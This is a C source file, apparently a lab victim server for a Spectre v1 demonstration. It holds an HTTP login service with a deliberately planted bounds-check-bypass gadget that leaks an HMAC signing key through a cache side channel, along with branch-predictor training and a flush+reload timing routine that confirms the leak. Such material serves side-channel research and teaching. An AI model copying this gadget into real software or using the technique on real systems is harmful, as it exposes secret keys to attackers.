#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <openssl/hmac.h>
#include <sys/time.h>
#include <stdint.h>
#include <x86intrin.h>
#include <sys/mman.h>

#include "victim.h"

#define PORT 8080
#define BUFFER_SIZE 1024
#define RESPONSE_SIZE 1024
#define KEY_SIZE 8
#define USERNAME_MAX 16
#define PASSWORD_MAX 32
#define CACHE_STRIDE 4096 // change to 64 for L1 attack

int attack_id = ((unsigned long)&layout.secret_key[0]-(unsigned long)&layout.role_binding.roles[0]);

struct Users users;

struct SharedMemory layout = {
    .role_binding.roles  ={0},
    .role_binding.role_count = ROLE_COUNT, // = 5,
    .padding1 = {0},
    .padding2 = {0},
    .secret_key = {0x26, 0x43, 0x17, 0x59, 0x25, 0x6B, 0x3D, 0x07}
};

int main(){

    size_t probe_size = 2 * 1024 * 1024; 
    
    layout.role_usage = mmap(NULL, probe_size, PROT_READ | PROT_WRITE, 
                             MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);

    if (layout.role_usage == MAP_FAILED) {
        perror("mmap failed - use sudo sysctl -w vm.nr_hugepages=256");
        exit(1);
    }
    memset(layout.role_usage, 1, probe_size);

    users = load_users();

    // check for spectrev1 signal presence
    //spectre_flush_reload();
    //exit(1);

    // tests attack id and returns set association
    calc_set();
    // forces role_usage array to exist in RAM
    
    // mem address and attack id info
    printf("memory address of first byte signing key: %p\n", &layout.secret_key[0]);
    printf("memory address of start of roles array: %p\n", (void *)&layout.role_binding.roles[0]);
    printf("memory address of start of role_usage array: %p\n", (void *)&layout.role_usage[0]);
    printf("\nSigning Key Address in Dec: %lu \nRoles array Address in Dec: %lu\nDiff: %lu\n\n", (unsigned long)&layout.secret_key[0], (unsigned long)&layout.role_binding.roles[0], ((unsigned long)&layout.secret_key[0]-(unsigned long)&layout.role_binding.roles[0]));
    
    // initialises server and opens server for connections
    struct Server server = server__constructor(AF_INET, 0, SOCK_STREAM, INADDR_ANY, PORT, 10, launch);
    // initialises user registry with one user
    
    server.launch(&server);
    return 0;
}

void calc_set(){
    for (int i = attack_id; i < attack_id+8; i++){
        uint8_t *role_ptr = (uint8_t *)&layout.role_binding.roles[0];
        uint8_t byte = layout.role_binding.roles[i];//role_ptr[attack_id];
        uintptr_t address = (uintptr_t)&layout.role_usage[byte * CACHE_STRIDE]; // get mem address it will map to 

        int set = (address >> 6) & 0x3F;

        // prints target byte that correct attack_id will speculativly load
        printf("ATTACK ID: %d ,LEAKED BYTE: 0x%x, Memory Address: %p -> Set %d\n", i, role_ptr[i], &layout.role_usage[role_ptr[i] * CACHE_STRIDE], set);
    }
}

struct Server server__constructor(int domain, int protocol, int type, in_addr_t interface, int port, int backlog, void(*launch)(struct Server *server))
{
    struct Server server;

    server.domain = domain;
    server.protocol = protocol;
    server.type = type;
    server.port = port;
    server.backlog = backlog;
    server.interface = interface;
    server.launch = launch;

    server.address.sin_family = domain;
    server.address.sin_port = htons(port); // converts to network address
    server.address.sin_addr.s_addr = htonl(interface);

    // creates socket: domain (IPv4 or 6), type (TCP or UDP), protocol
    server.socket = socket(domain, type, protocol);
    if (server.socket < 0){
        perror("Server socket connection failed.\n");
        exit(EXIT_FAILURE);
    }
    // bind socket to an address and port
    int binded = bind(server.socket, (struct sockaddr *)&server.address, sizeof(server.address));
    if (binded < 0){
        perror("Server socket binding failed.\n");
        exit(EXIT_FAILURE);
    }

    // await a connection
    if (listen(server.socket, server.backlog) < 0){
        perror("Server failed to start listening.\n");
        exit(EXIT_FAILURE);
    }
    printf("server is running on: http://localhost:%d\n", PORT);

    return server;
}

// loads set of users into memory
struct Users load_users(){
    users.users[0] = "user1";
    users.passwords[0] = "password";

    return users;
}

// responds to any request with fixed token from get_token() function
void launch(struct Server *server)
{
    
    int address_length = sizeof(server->address);
    // bring role_usage into mem
    for(int i = 0; i < 256; i++) {
        layout.role_usage[i * 64] = 0x00; 
    }
    _mm_mfence();
    while(1){
        
        printf("\n========== WAITING FOR CONNECTION ==========\n");
        //fflush(stdout);
        int new_socket = accept(server->socket, (struct sockaddr *)&server->address, (socklen_t *)&address_length);

        while(1){
            char buffer[BUFFER_SIZE] = {0};
            char response[RESPONSE_SIZE];

            int noBytes = read(new_socket, buffer, BUFFER_SIZE);
            if (noBytes < 1){
                printf("\n========== CLIENT DISCONNECTED ==========\n");
                break;
            }

            printf("\n========== NEW REQUEST ==========\n");
            printf("%s\n", buffer);

            char username[USERNAME_MAX];
            char password[PASSWORD_MAX];
            unsigned int user_id;
            // gets params from POST body and assigns to local vars
            int status = get_POST_body(username, password, &user_id, buffer);
            if (status > 0){
                // trains bp for Spectre_v1
                int training_loops = 200 + (rand() % 30); // rndomised training loop so bp can't learn
                for (int k = 0; k < training_loops; k++) {
                    volatile uint8_t warm_roles = layout.role_binding.roles[0];  // warm roles so no long fetch needed
                    
                    // flush to train bp
                    _mm_clflush(&layout.role_binding.role_count);
                    _mm_mfence();

                    // call function with valid data
                    get_token("none", "none", 0);
                }   
                _mm_lfence(); 

                // sends result from get_token function
                _mm_clflush(&layout.role_binding.role_count);
                _mm_mfence();

                for(volatile int z = 0; z < 100; z++) {} // pause

                char *data = get_token(username, password, user_id);
                _mm_mfence();

                if (data != NULL){
                    //http_response(response, RESPONSE_SIZE, 200, data);
                    //write(new_socket, response, strlen(response));
                    write(new_socket, "HTTP/1.1 200 OK\r\nContent-Length: 1\r\n\r\nX", 38);
                } 
                else{
                    // data =  "HTTP/1.1 400 Not Authorised\r\n"
                            // "Content-Type: text/plain\r\n"
                            // "Content-Length: 30\r\n"
                            // "Connection: keep-alive\r\n"
                            // "\r\n"
                            // "Incorrect username or password";
                    // write(new_socket, data, strlen(data));
                    write(new_socket, "HTTP/1.1 400 Bad Request\r\nContent-Length: 1\r\n\r\nX", 48);
                }

            }
        }
        close(new_socket);
    }
}

volatile uint8_t temp;
// generates response based on user credentials provided
char * get_token(char *username, char *password, unsigned int user_id)
{
    // ===============  SPECTRE VULNERABILITY ===============
    //volatile uint8_t dummy = layout.role_binding.roles[0]; // loads into cache
    
    if(user_id < layout.role_binding.role_count){
        temp = layout.role_usage[layout.role_binding.roles[user_id] * CACHE_STRIDE]; // * CACHE_STRIDE ensures each unqiue byte maps to unique cache set
        
    // ======================================================   
        temp = temp + 1;
    }

    if(user_id < layout.role_binding.role_count){
        uint8_t role = layout.role_binding.roles[user_id];
        
        int result = check(username, password);
        _mm_mfence();
        if (result == 1){
            static char response[128];
   
            // get token
            unsigned char signature[EVP_MAX_MD_SIZE];
            sign(username, role, signature);

            // converts token byte sequence to hex
            for (int i = 0; i < 32; i++){
                sprintf(&response[i * 2], "%02x\n", signature[i]);
            }
            response[65] = '\0';
            return response;
        }
    }
    return NULL;
    //return "wrong username or password\n";
}

// returns 1 if username + password correct
int check(char *username, char *password)
{
    if (strcmp(username, users.users[0]) == 0){
        if (strcmp(password, users.passwords[0]) == 0){
            return 1;
        }
    }
    return 0;
}

// performs signature -> HMAC(SIGNING_KEY){username, role, timestamp}
void sign(char *username, uint8_t role, unsigned char *signature){
    // create plaintext
    unsigned int sig_len;
    char plaintext[64]; // 16 chars (MAX_USERNAME) + 10 (ID) + 8 (timestamp) + 1 (null) - 64 for safety
    time_t currentTime;
    time(&currentTime); // Get the current time

    snprintf(plaintext, sizeof(plaintext),  "%s%x%s", username, role, ctime(&currentTime));

    HMAC(EVP_sha256(), layout.secret_key, KEY_SIZE, (const unsigned char *)plaintext, strlen(plaintext), signature, &sig_len);
}


int get_POST_body(char *username, char *password, unsigned int *id, const char *buffer)
{
    int found = 0;

    char *body = strstr(buffer, "\r\n\r\n");
    if(!body) return -1; // no body

    body +=4; // removes \r\n\r\n

    // get username, password and id
    char *user_ptr = strstr(body, "username=");
    if (user_ptr) {
        sscanf(user_ptr, "username=%15[^& ]", username); // read 15 chars up to '&'
        found ++;
    }

    char *pass_ptr = strstr(body, "password=");
    if (pass_ptr) {
        sscanf(pass_ptr, "password=%31[^& ]", password); // read 31 chars
        found ++;
    }

    char *id_ptr = strstr(body, "id=");
    if (id_ptr) {
        *id = atoi(id_ptr + 3); // convert id val to int
        found ++;
    }

    if (found == 3){
        return 1;
    }
    return 0;
} 


// builds http response
void http_response(char *response, int response_size, int status_code, char *message){
    const char *status_text;

    //get status code message
    switch (status_code) {
        case 200: status_text = "OK"; break;
        case 400: status_text = "Bad Request"; break;
        default:  status_text = "Unknown"; break;
    }

    // add status code and message to response
    snprintf(response, response_size,
        "HTTP/1.1 %d %s\r\n"
        "Content-Type: text/plain\r\n"
        "Content-Length: %zu\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        "%s",
        status_code,
        status_text,
        strlen(message),
        message
    );
}

// runs a flush + reload attack on get_token() and return the total runs where spectre side effectwas detected
void spectre_flush_reload() {
    printf("\nChecking if get_token() triggers spectre\n");

    uint8_t target_byte = layout.secret_key[0]; // taregtign 0x23
    volatile uint8_t *target_probe = &layout.role_usage[target_byte * CACHE_STRIDE]; // address where spectre should write to 

    char *u = "none";
    char *p = "none";
    size_t time = 0;
    int total_successes = 0; //count

    for (int r = 0; r < 100; r++){
        
        int hits = 0;
        unsigned int junk;

        for (int t = 0; t < 1000; t++) {
            // FLUSH
            _mm_clflush((void*)target_probe);
            _mm_mfence();

            // TRAINING BP
            int training_loops = 200 + (rand() % 30); // rndomised training loop so bp can't learn
            for (int k = 0; k < training_loops; k++) {
                //volatile uint8_t warm_up = layout.secret_key[0]; // warm secret so no long fetch needed
                volatile uint8_t warm_roles = layout.role_binding.roles[0];
                _mm_clflush(&layout.role_binding.role_count);
                _mm_mfence();
                get_token(u, p, 0);
            }   
            _mm_lfence(); 

            // ATTACK
            _mm_clflush(&layout.role_binding.role_count);
            _mm_mfence();
            
            for(volatile int z = 0; z < 100; z++) {}

            get_token(u, p, attack_id);
            _mm_mfence();

            // RELOAD
            uint64_t t1 = __rdtscp(&junk);
            volatile uint8_t temp_read = *target_probe; 
            uint64_t t2 = __rdtscp(&junk);

            // threshold of 160
            if (t2-t1 <= 160) {
                //printf("Hit Time: %lu\n", (t2-t1));
                time += (size_t)(t2-t1);
                hits++;
            }
        }
    
        if (hits > 800) {
             printf("Success (Hits: %d / 1000)\n", hits);
             total_successes++;
        }
    }   
    float avg = (float)time / (1000 * 100);

    printf("\nTotal Success Runs %d / 100\n AVG HIT TIME: %0.1f\n", total_successes, avg);
}